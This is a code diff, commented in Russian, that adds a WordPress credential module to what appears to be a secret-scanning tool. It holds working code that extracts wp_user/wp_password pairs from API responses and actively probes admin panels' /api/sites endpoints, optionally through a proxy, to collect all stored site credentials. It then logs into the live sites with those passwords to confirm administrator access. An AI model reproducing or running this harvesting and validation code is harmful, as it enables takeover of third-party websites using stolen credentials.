@@ -903,6 +903,111 @@ async def verify_secret(
 
 
 # ---------------------------------------------------------------------------
+# WordPress finder: админ-креды сайтов (wp_user/wp_password) в API-ответах.
+# Пример утечки: GET /api/sites -> [{id,name,url,wp_user,wp_password,...}]
+# Верификация read-only: GET {site}/wp-json/wp/v2/users/me, Basic auth.
+# ---------------------------------------------------------------------------
+WP_PAIR_RE = re.compile(
+    r'"wp_user"\s*:\s*"([^"]{1,80})"[^{}]{0,300}?"wp_password"\s*:\s*"([^"]{4,})"', re.I)
+WP_SITE_ENTRY_RE = re.compile(
+    r'"(?:url|site_url|domain)"\s*:\s*"([^"]{1,200})"[^{}]{0,400}?"wp_user"\s*:\s*"([^"]{1,80})"'
+    r'[^{}]{0,300}?"wp_password"\s*:\s*"([^"]{4,})"', re.I)
+
+
+def extract_wp_creds(text: str, fallback_url: str = "") -> list[dict[str, str]]:
+    """Пары (site_url, user, password) WordPress из JSON-подобного текста.
+
+    Сначала adjacency url->wp_user->wp_password, затем пары без url
+    (fallback_url = хост, на котором найдено тело).
+    """
+    out: list[dict[str, str]] = []
+    seen: set[tuple[str, str, str]] = set()
+    for site_url, user, pwd in WP_SITE_ENTRY_RE.findall(text):
+        sig = (site_url, user, pwd)
+        if sig not in seen:
+            seen.add(sig)
+            out.append({"site_url": site_url, "user": user, "password": pwd})
+    for user, pwd in WP_PAIR_RE.findall(text):
+        sig = (fallback_url, user, pwd)
+        if sig not in seen and not any(
+            s[1] == user and s[2] == pwd for s in seen
+        ):
+            seen.add(sig)
+            out.append({"site_url": fallback_url, "user": user, "password": pwd})
+    return out
+
+
+async def verify_wp_creds(session: aiohttp.ClientSession, site_url: str,
+                          user: str, password: str, proxy: str | None = None,
+                          timeout_s: float = 8.0) -> dict[str, Any]:
+    """WordPress REST: GET /wp-json/wp/v2/users/me, Basic user:password (read-only).
+
+    context=edit даёт roles/capabilities (administrator = полный контроль).
+    """
+    result: dict[str, Any] = {
+        "site": site_url, "user": user, "status": "error", "detail": "",
+    }
+    auth = base64.b64encode(f"{user}:{password}".encode()).decode()
+    try:
+        async with session.get(
+            site_url.rstrip("/") + "/wp-json/wp/v2/users/me?context=edit",
+            headers={
+                "Authorization": f"Basic {auth}",
+                "Accept": "application/json",
+                "User-Agent": "Mozilla/5.0 (compatible; scanner)",
+            },
+            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json(content_type=None)
+                if isinstance(data, dict) and data.get("id"):
+                    roles = ", ".join(data.get("roles") or []) or "?"
+                    result["status"] = "valid"
+                    result["roles"] = data.get("roles") or []
+                    result["detail"] = (
+                        f"WP {site_url} — {data.get('name') or data.get('slug') or '?'} "
+                        f"roles={roles}"
+                    )
+                else:
+                    result["detail"] = "no user context"
+            elif resp.status in (401, 403):
+                result["status"] = "invalid"
+                result["detail"] = f"HTTP {resp.status}"
+            else:
+                result["detail"] = f"HTTP {resp.status}"
+    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
+        result["detail"] = type(exc).__name__
+    return result
+
+
+async def probe_wp_sites(session: aiohttp.ClientSession, base_url: str,
+                         proxy: str | None = None,
+                         timeout_s: float = 8.0) -> list[dict[str, str]]:
+    """Активный пробер: GET /api/sites — админ-панель отдаёт все сайты сразу."""
+    out: list[dict[str, str]] = []
+    try:
+        async with session.get(
+            base_url.rstrip("/") + "/api/sites",
+            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
+        ) as resp:
+            if resp.status != 200 or "json" not in (resp.headers.get("content-type") or ""):
+                return out
+            data = await resp.json(content_type=None)
+            if not isinstance(data, list):
+                return out
+            for entry in data:
+                if isinstance(entry, dict) and entry.get("wp_user") and entry.get("wp_password"):
+                    out.append({
+                        "site_url": entry.get("url") or "",
+                        "user": str(entry["wp_user"]),
+                        "password": str(entry["wp_password"]),
+                    })
+    except (aiohttp.ClientError, TimeoutError, OSError, ValueError):
+        return out
+    return out
+
+
+# ---------------------------------------------------------------------------
 # Twilio: пара AccountSid (AC/SK) + AuthToken, HTTP Basic (read-only)
 # ---------------------------------------------------------------------------
 TWILIO_PAIR_RE = re.compile(
